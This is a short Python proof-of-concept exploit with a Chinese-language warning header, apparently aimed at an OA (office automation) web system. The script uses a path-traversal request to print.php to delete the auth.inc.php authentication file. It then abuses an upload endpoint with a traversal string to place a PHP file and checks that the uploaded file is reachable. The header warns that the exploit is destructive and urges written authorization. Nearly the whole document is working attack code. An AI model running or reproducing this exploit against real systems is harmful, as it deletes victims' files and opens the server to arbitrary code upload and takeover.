'''
更新：
特别提醒：
本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作
并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP
使用时请一定一定要慎重，一定要获取对方书面授权再使用
如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测/module/appbuilder/assets/print.php是否存在
'''
import requests
target="http://127.0.0.1:8203/"
payload="<?php echo 123456 ?>"
print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
input("Press enter to continue")
print("[*]Deleting auth.inc.php....")

url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
requests.get(url=url)
print("[*]Checking if file deleted...")
url=target+"/inc/auth.inc.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[-]Failed to deleted auth.inc.php")
    exit(-1)
print("[+]Successfully deleted auth.inc.php!")
print("[*]Uploading payload...")
url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
files = {'FILE1': ('hack.php', payload)}
requests.post(url=url,files=files)
url=target+"/_hack.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[+]Filed Uploaded Successfully")
    print("[+]URL:",url)
else:
    print("[-]Failed to upload file")
